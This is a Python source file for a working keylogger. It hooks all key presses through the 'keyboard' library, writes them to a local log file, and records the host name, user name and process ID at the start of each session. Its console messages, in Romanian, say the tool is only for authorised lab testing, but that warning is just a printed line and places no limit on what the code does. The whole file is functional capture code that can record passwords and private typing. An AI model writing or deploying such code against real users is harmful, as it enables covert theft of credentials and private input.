import os
import time
from datetime import datetime
import keyboard

class Keylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.running = True
        self._write_header()

    def _get_timestamp(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def _write(self, text):
        with open(self.log_file, 'a') as f:
            f.write(text)
            f.flush()

    def _write_header(self):
        self._write(f"\n=== KEYLOG SESSION ===\nStart: {self._get_timestamp()}\nHost: {os.uname().nodename}\nUser: {os.getenv('USER', 'unknown')}\nPID: {os.getpid()}\n=====================\n")

    def _write_footer(self):
        self._write(f"End: {self._get_timestamp()}\n=====================\n")

    def _on_press(self, event):
        if event.event_type == 'down':
            key = event.name
            if len(key) == 1:
                self._write(key)
            else:
                special_map = {'space': ' ', 'enter': '\n', 'tab': '\t', 'backspace': '[BACKSPACE]'}
                self._write(special_map.get(key, f'[{key}]'))

    def start(self):
        print(f"🔍 Keylogger pornit. Log: {self.log_file}")
        print("⏹️  Apasă ESC pentru a opri.")
        keyboard.on_press(self._on_press)
        keyboard.wait('esc')
        self._write_footer()
        print(f"✅ Keylogger oprit. Log salvat în {self.log_file}")

if __name__ == "__main__":
    print("⚠️  ACEST TOOL ESTE PENTRU TESTARE ÎN MEDIU CONTROLAT.")
    print("⚠️  NU UTILIZAȚI ÎN AFARA UNUI LABORATOR AUTORIZAT.")
    print("=" * 60)
    Keylogger().start()
